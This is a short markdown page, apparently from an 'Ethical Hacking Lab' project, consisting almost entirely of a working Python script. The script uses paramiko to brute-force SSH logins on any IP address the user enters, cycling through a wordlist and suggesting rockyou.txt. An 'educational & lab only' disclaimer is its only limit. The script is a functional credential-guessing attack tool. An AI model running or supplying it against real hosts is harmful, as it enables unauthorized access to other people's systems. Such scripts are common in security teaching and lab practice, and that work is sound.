
---

# 🔹 Project 2: Ethical Hacking Lab  

### `kali_bruteforce_ssh.py`  
```python
#!/usr/bin/env python3
"""
Ethical Hacking Lab - SSH Brute Force Demo
------------------------------------------
This script simulates a brute force attack on SSH.
It tries multiple passwords from a wordlist until the correct one is found.
⚠️ For educational & lab environments only.
"""

import paramiko

def ssh_bruteforce(host, username, password_list):
    print(f"[+] Starting SSH Brute Force on {host} with user '{username}'")

    for password in password_list:
        try:
            print(f"[*] Trying password: {password.strip()}")
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            ssh.connect(host, username=username, password=password.strip(), timeout=3)
            print(f"[+] Success! Password found: {password.strip()}")
            ssh.close()
            return
        except:
            continue

    print("[-] Password not found in list.")

if __name__ == "__main__":
    target_host = input("Enter Target IP: ")
    target_user = input("Enter SSH Username: ")

    # Sample wordlist (you can replace with rockyou.txt in Kali)
    wordlist = ["12345", "password", "kali", "hack123"]

    ssh_bruteforce(target_host, target_user, wordlist)
